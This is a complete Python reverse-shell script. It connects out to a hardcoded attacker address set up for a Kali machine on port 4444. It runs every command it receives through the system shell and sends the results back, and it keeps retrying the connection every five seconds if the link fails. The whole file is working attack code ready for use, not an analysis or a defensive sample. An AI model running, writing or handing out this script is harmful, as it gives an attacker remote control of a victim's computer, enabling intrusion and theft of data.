#!/usr/bin/env python3
import socket
import subprocess
import os
import sys

# CHANGE THIS TO YOUR KALI IP AND PORT
KALI_IP = "192.168.1.112"
KALI_PORT = 4444

def reverse_shell():
    try:
        # Create socket connection
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((KALI_IP, KALI_PORT))
        
        while True:
            # Receive command from Kali
            command = client.recv(4096).decode('utf-8', errors='ignore')
            
            if not command:
                break
            
            if command.lower() == 'exit':
                client.close()
                sys.exit(0)
            
            # Execute command
            try:
                # Handle cd command
                if command.lower().startswith('cd '):
                    try:
                        os.chdir(command[3:].strip())
                        result = f"Directory changed to: {os.getcwd()}"
                    except Exception as e:
                        result = f"Error: {e}"
                else:
                    # Execute any command
                    output = subprocess.run(command, shell=True, capture_output=True, text=True)
                    result = output.stdout + output.stderr
                    if not result:
                        result = "[+] Command executed successfully"
            except Exception as e:
                result = f"Error: {e}"
            
            # Send result back to Kali
            current_dir = os.getcwd()
            send_back = f"{result}\nPS {current_dir}> "
            client.send(send_back.encode('utf-8', errors='ignore'))
        
        client.close()
        
    except Exception as e:
        # If connection fails, retry after 5 seconds
        import time
        time.sleep(5)
        reverse_shell()

if __name__ == "__main__":
    reverse_shell()
